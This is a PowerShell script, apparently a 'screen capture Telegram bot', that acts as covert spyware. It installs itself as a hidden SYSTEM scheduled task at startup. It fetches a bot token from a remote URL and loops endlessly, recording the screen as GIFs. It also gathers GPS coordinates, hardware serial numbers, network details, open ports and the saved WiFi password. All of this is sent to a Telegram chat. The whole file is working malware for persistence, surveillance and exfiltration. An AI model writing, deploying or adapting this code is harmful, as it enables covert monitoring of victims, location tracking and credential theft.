param(
    [switch]$background
)

# -------------------------------
# If not running in background mode, register a scheduled task and exit
# -------------------------------
if (-not $background) {
    $taskName = "ScreenCaptureTelegramBot"
    try {
        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    }
    catch {
        $existingTask = $null
    }
    
    if (-not $existingTask) {
        # Determine the full script path
        if ($PSCommandPath) {
            $scriptPath = $PSCommandPath
        }
        else {
            $scriptPath = $MyInvocation.MyCommand.Definition
        }

        # Create the task action to run the script with the -background switch, hidden.
        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -background"
        
        # Create a trigger to run the task at startup
        $trigger = New-ScheduledTaskTrigger -AtStartup

        # Create a principal to run as SYSTEM (this may require elevated privileges)
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

        try {
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
            Write-Output "Scheduled task '$taskName' registered. It will run in the background at startup."
            # Optionally, start the task immediately
            Start-ScheduledTask -TaskName $taskName
        }
        catch {
            Write-Error "Failed to register scheduled task: $_"
        }
        exit
    }
}

# ===============================
# Enable DPI Awareness to capture full resolution on high DPI screens
# ===============================
Add-Type -MemberDefinition @"
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
"@ -Name NativeMethods -Namespace MyNamespace
[MyNamespace.NativeMethods]::SetProcessDPIAware() | Out-Null

# ===============================
# Configuration & Credentials from Remote Source
# ===============================
$credUrl = "https://raw.githubusercontent.com/Aman-SecurityKnock/ScreenCapture-TelegramBot/refs/heads/main/src/cred.dat"
try {
    $CredJson = (Invoke-WebRequest -Uri $credUrl -UseBasicParsing).Content
    $Cred = $CredJson | ConvertFrom-Json
}
catch {
    Write-Error "Failed to retrieve credentials from remote URL: $_"
    exit
}

# ===============================
# Decrypt-Credential Function (checks for encrypted format)
# ===============================
function Decrypt-Credential {
    param ([string]$EncryptedString)
    # If the string looks like an encrypted secure string (usually starts with "01000000")
    if ($EncryptedString -match '^01000000') {
        try {
            $secure = ConvertTo-SecureString $EncryptedString -ErrorAction Stop
            $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
            $plain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
            [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
            return $plain
        }
        catch {
            return $EncryptedString
        }
    }
    else {
        return $EncryptedString
    }
}

$BotToken = Decrypt-Credential -EncryptedString $Cred.BotToken
$ChatID   = Decrypt-Credential -EncryptedString $Cred.ChatID

# ===============================
# Function: Capture a single screenshot frame as a BitmapSource
# ===============================
function Capture-Frame {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName PresentationCore

    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $graphics.Dispose()

    $hBitmap = $bmp.GetHbitmap()
    $bitmapSource = [System.Windows.Interop.Imaging]::CreateBitmapSourceFromHBitmap(
        $hBitmap,
        [IntPtr]::Zero,
        [System.Windows.Int32Rect]::new(0,0,$bmp.Width,$bmp.Height),
        [System.Windows.Media.Imaging.BitmapSizeOptions]::FromEmptyOptions()
    )
    Add-Type -MemberDefinition @"
    [DllImport("gdi32.dll")]
    public static extern bool DeleteObject(IntPtr hObject);
"@ -Name GDI32 -Namespace Win32
    [Win32.GDI32]::DeleteObject($hBitmap) | Out-Null
    $bmp.Dispose()
    return $bitmapSource
}

# ===============================
# Function: Capture an Animated GIF of the Screen over a Given Duration
# ===============================
function Capture-AnimatedGIF {
    param(
        [int]$durationSeconds = 10,
        [int]$framesPerSecond = 3
    )
    Add-Type -AssemblyName PresentationCore

    $encoder = New-Object System.Windows.Media.Imaging.GifBitmapEncoder
    $totalFrames = [Math]::Ceiling($durationSeconds * $framesPerSecond)
    $frameInterval = 1 / $framesPerSecond

    for ($i = 0; $i -lt $totalFrames; $i++) {
        $frame = Capture-Frame
        $encoder.Frames.Add([System.Windows.Media.Imaging.BitmapFrame]::Create($frame))
        Start-Sleep -Seconds $frameInterval
    }
    $gifPath = "C:\Temp\screenrecord.gif"
    $fs = [System.IO.File]::Open($gifPath, [System.IO.FileMode]::Create)
    $encoder.Save($fs)
    $fs.Close()
    return $gifPath
}

# ===============================
# Function: Send an Animation (GIF) to the Telegram Bot
# ===============================
function Send-TelegramAnimation {
    param (
        [string]$GifPath
    )
    
    $Uri = "https://api.telegram.org/bot$BotToken/sendAnimation"
    
    # Create a boundary for multipart/form-data
    $Boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
    $LF = "`r`n"
    
    $ms = New-Object System.IO.MemoryStream
    
    # Field: chat_id
    $chatIdHeader = "--$Boundary$LF" +
                    'Content-Disposition: form-data; name="chat_id"' + $LF + $LF +
                    $ChatID + $LF
    $chatIdHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($chatIdHeader)
    $ms.Write($chatIdHeaderBytes, 0, $chatIdHeaderBytes.Length)
    
    # Field: animation file
    $fileBytes = [System.IO.File]::ReadAllBytes($GifPath)
    $fileHeader = "--$Boundary$LF" +
                  'Content-Disposition: form-data; name="animation"; filename="' + (Split-Path $GifPath -Leaf) + '"' + $LF +
                  "Content-Type: image/gif$LF$LF"
    $fileHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($fileHeader)
    $ms.Write($fileHeaderBytes, 0, $fileHeaderBytes.Length)
    $ms.Write($fileBytes, 0, $fileBytes.Length)
    
    # Ending boundary
    $ending = "$LF--$Boundary--$LF"
    $endingBytes = [System.Text.Encoding]::UTF8.GetBytes($ending)
    $ms.Write($endingBytes, 0, $endingBytes.Length)
    
    $ms.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    $ContentBytes = $ms.ToArray()
    
    $WebRequest = [System.Net.HttpWebRequest]::Create($Uri)
    $WebRequest.Method = "POST"
    $WebRequest.ContentType = "multipart/form-data; boundary=$Boundary"
    $WebRequest.ContentLength = $ContentBytes.Length
    
    $Stream = $WebRequest.GetRequestStream()
    $Stream.Write($ContentBytes, 0, $ContentBytes.Length)
    $Stream.Close()
    
    $Response = $WebRequest.GetResponse()
    $ResponseStream = $Response.GetResponseStream()
    $Reader = New-Object System.IO.StreamReader($ResponseStream)
    $null = $Reader.ReadToEnd() | Out-Null
    $Reader.Close()
    $ResponseStream.Close()
    $Response.Close()
}

# ===============================
# Function: Send a Text Message to the Telegram Bot
# ===============================
function Send-TelegramMessage {
    param (
        [string]$Message
    )
    $Uri = "https://api.telegram.org/bot$BotToken/sendMessage"
    $Body = @{
        chat_id = $ChatID
        text    = $Message
    }
    try {
        Invoke-RestMethod -Uri $Uri -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json) | Out-Null
    }
    catch {
        Write-Error "Failed to send message: $_"
    }
}

# ===============================
# Function: Get Native GPS Location using Windows Location Services
# ===============================
Add-Type -AssemblyName System.Device
function Get-WindowsGeolocation {
    $watcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $watcher.Start()
    
    # Wait for location acquisition (max 30 seconds)
    $timeout = 30
    while ($watcher.Status -ne 'Ready' -and $timeout -gt 0) {
        Start-Sleep -Milliseconds 100
        $timeout--
    }

    if ($watcher.Position.Location.IsUnknown) {
        return $null
    }

    return @{
        Latitude = $watcher.Position.Location.Latitude
        Longitude = $watcher.Position.Location.Longitude
        Accuracy = $watcher.Position.Location.HorizontalAccuracy
    }
}

# ===============================
# Function: Get Complete System & Network Information
# Combines basic info with detailed hardware, BIOS, and network details.
# ===============================
function Get-CompleteSystemInfo {
    # --- Basic System Information ---
    $computerName = $env:COMPUTERNAME
    $osInstance = Get-CimInstance Win32_OperatingSystem
    $osInfo = "$($osInstance.Caption) (Version: $($osInstance.Version))"
    $dateTime = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

    $basicInfo = "=== Basic System Information ===`n" +
                 "Computer Name: $computerName`n" +
                 "OS: $osInfo`n" +
                 "Date/Time: $dateTime`n"

    # --- WiFi Info (from netsh) ---
    try {
        $wifiOutput = netsh wlan show interfaces | Out-String
        $ssid   = ($wifiOutput | Select-String "^\s*SSID\s+:\s+(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })[0]
        $signal = ($wifiOutput | Select-String "^\s*Signal\s+:\s+(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })[0]
        if (-not $ssid) { $ssid = "N/A" }
        if (-not $signal) { $signal = "N/A" }
    }
    catch {
        $ssid = "N/A"
        $signal = "N/A"
    }
    $wifiInfo = "WiFi SSID: $ssid`nWiFi Signal: $signal`n"

    # --- GPS Location ---
    $geo = Get-WindowsGeolocation
    if ($geo) {
        $latitude = $geo.Latitude
        $longitude = $geo.Longitude
        $accuracy = $geo.Accuracy
        $locationInfo = "Latitude: $latitude, Longitude: $longitude (Accuracy: $accuracy m)"
    }
    else {
        $locationInfo = "Location unavailable. Ensure Location Services are enabled."
    }
    $locationSection = "GPS Location: $locationInfo`n"

    # --- Detailed System Information ---
    $cs = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Manufacturer, Model
    $csp = Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object Name, Version, IdentifyingNumber, UUID, Vendor
    $bios = Get-CimInstance -ClassName Win32_BIOS | Select-Object SerialNumber, Version, ReleaseDate
    $enclosure = Get-CimInstance -ClassName Win32_SystemEnclosure | Select-Object SerialNumber, ChassisTypes

    $systemInfoSection = "=== Detailed System Information ===`n" +
                         "Manufacturer: $($cs.Manufacturer)`n" +
                         "Model (Friendly Name): $($cs.Model)`n" +
                         "MTM (Machine Type Model): $($csp.Name)`n"
    if ($csp.Version) {
        $systemInfoSection += "Product Version: $($csp.Version)`n"
    }
    $biosSection = "`nBIOS Information:`n" +
                   "  Serial Number: $($bios.SerialNumber)`n" +
                   "  BIOS Version: $($bios.Version)`n" +
                   "  Release Date: $($bios.ReleaseDate)`n"
    $enclosureSection = "`nSystem Enclosure:`n" +
                        "  Serial Number: $($enclosure.SerialNumber)`n" +
                        "  Chassis Type: $($enclosure.ChassisTypes)`n"
    $productSection = "`nProduct Information:`n" +
                      "  Identifying Number (SN): $($csp.IdentifyingNumber)`n" +
                      "  UUID: $($csp.UUID)`n" +
                      "  Vendor: $($csp.Vendor)`n"

    # --- Network Information ---
    # IP Addresses
    $ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | 
                   Where-Object { $_.PrefixOrigin -ne 'WellKnown' -and $_.IPAddress -notlike '127.*' } |
                   Select-Object InterfaceAlias, IPAddress, PrefixLength
    $ipInfo = "`n=== Network Information ===`nIP Addresses:`n"
    foreach ($ip in $ipAddresses) {
        $ipInfo += "Interface: $($ip.InterfaceAlias) - IP: $($ip.IPAddress) / $($ip.PrefixLength)`n"
    }

    # Detailed WiFi Information
    try {
        $wifiAdapter = Get-NetAdapter -ErrorAction Stop | Where-Object { $_.MediaType -eq 'Native 802.11' -and $_.Status -eq 'Up' }
        if ($wifiAdapter) {
            $wifiDetails = netsh wlan show interfaces | Out-String
            $bssid = ($wifiDetails | Select-String 'BSSID').Line -replace '.*BSSID\s*:\s*',''
            $essid = ($wifiDetails | Select-String 'SSID').Line.Split(':')[1].Trim()
            $wifiSection = "`nWiFi Information:`n" +
                           "ESSID: $essid`n" +
                           "BSSID: $bssid`n"
            # Attempt to get WiFi password if running as administrator
            $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            if ($isAdmin) {
                try {
                    $profileName = ($wifiDetails | Select-String 'Profile').Line.Split(':')[1].Trim()
                    $wifiPassword = (netsh wlan show profile name="$profileName" key=clear | 
                        Select-String 'Key Content').Line.Split(':')[1].Trim()
                    $wifiSection += "Password: $wifiPassword`n"
                }
                catch {
                    $wifiSection += "Password: Could not retrieve WiFi password`n"
                }
            }
        }
        else {
            $wifiSection = "`nNo active WiFi interface found`n"
        }
    }
    catch {
        $wifiSection = "`nError retrieving WiFi information`n"
    }

    # Open Ports (Listening)
    try {
        $listeningPorts = Get-NetTCPConnection -State Listen | 
                          Where-Object { $_.LocalAddress -ne '127.0.0.1' } |
                          Select-Object LocalAddress, LocalPort, 
                              @{Name='Process'; Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name}},
                              OwningProcess
        $portsSection = "`nOpen Ports (Listening):`n"
        foreach ($port in $listeningPorts) {
            $portsSection += "IP: $($port.LocalAddress) - Port: $($port.LocalPort) - Process: $($port.Process)`n"
        }
    }
    catch {
        $portsSection = "`nError retrieving open ports information`n"
    }

    # Network Adapters
    $adapters = Get-NetAdapter | Where-Object Status -eq 'Up'
    $adaptersSection = "`nNetwork Adapters:`n"
    foreach ($adapter in $adapters) {
        $adaptersSection += "Name: $($adapter.Name), Description: $($adapter.InterfaceDescription), LinkSpeed: $($adapter.LinkSpeed)`n"
    }

    # Default Gateway
    $defaultGateway = Get-NetRoute -AddressFamily IPv4 | Where-Object DestinationPrefix -eq '0.0.0.0/0'
    $gatewaySection = "`nDefault Gateway:`n"
    foreach ($route in $defaultGateway) {
        $gatewaySection += "NextHop: $($route.NextHop), Interface: $($route.InterfaceAlias)`n"
    }

    # --- Combine All Sections ---
    $completeInfo = $basicInfo + $wifiInfo + $locationSection + $systemInfoSection + $biosSection + $enclosureSection + $productSection + $ipInfo + $wifiSection + $portsSection + $adaptersSection + $gatewaySection

    return $completeInfo
}

# ===============================
# Main Loop: Capture & Send a 10-Second Screen Recording (as Animated GIF)
# and send complete system information (including detailed hardware and network data)
# ===============================
while ($true) {
    $gifPath = Capture-AnimatedGIF -durationSeconds 10 -framesPerSecond 3
    Send-TelegramAnimation -GifPath $gifPath
    $systemInfo = Get-CompleteSystemInfo
    Send-TelegramMessage -Message $systemInfo
    Start-Sleep -Seconds 2
}
